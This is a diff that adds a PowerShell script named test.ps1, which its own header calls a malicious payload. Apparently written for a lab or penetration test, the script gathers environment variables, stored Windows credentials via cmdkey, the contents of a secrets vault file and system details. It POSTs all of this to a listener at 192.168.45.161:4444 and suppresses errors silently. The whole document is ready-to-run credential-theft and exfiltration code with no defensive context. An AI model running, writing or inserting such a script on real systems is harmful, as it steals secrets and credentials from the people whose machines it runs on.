@@ -1,0 +1,45 @@
+# test.ps1 - Malicious payload to extract credentials and environment info
+
+try {
+    # Collect environment variables
+    $envVars = Get-ChildItem Env: | ForEach-Object { "$($_.Name)=$($_.Value)" } | Out-String
+
+    # Attempt to read credentials from common locations (example: Windows Credential Manager)
+    # Requires running as user with access to credentials
+    $creds = @()
+    try {
+        $creds += cmdkey /list 2>&1
+    } catch {}
+
+    # Attempt to read secrets vault files if known path (adjust path as needed)
+    $vaultPath = "C:\ProgramData\SecretsVault\secrets.json"
+    $vaultContent = ""
+    if (Test-Path $vaultPath) {
+        $vaultContent = Get-Content $vaultPath -Raw
+    }
+
+    # Gather system info
+    $sysInfo = Get-ComputerInfo | Select-Object CsName, OsName, OsVersion, OsBuildNumber, WindowsProductName | Out-String
+
+    # Combine all info
+    $output = @"
+=== Environment Variables ===
+$envVars
+
+=== Stored Credentials (cmdkey) ===
+$($creds -join "`n")
+
+=== Secrets Vault Content ($vaultPath) ===
+$vaultContent
+
+=== System Information ===
+$sysInfo
+"@
+
+    # Exfiltrate data - example: send to your HTTP server (adjust URL)
+    $exfilUrl = "http://192.168.45.161:4444/exfiltrate"
+    Invoke-RestMethod -Uri $exfilUrl -Method POST -Body $output -ContentType "text/plain"
+}
+catch {
+    # Handle errors silently
+}
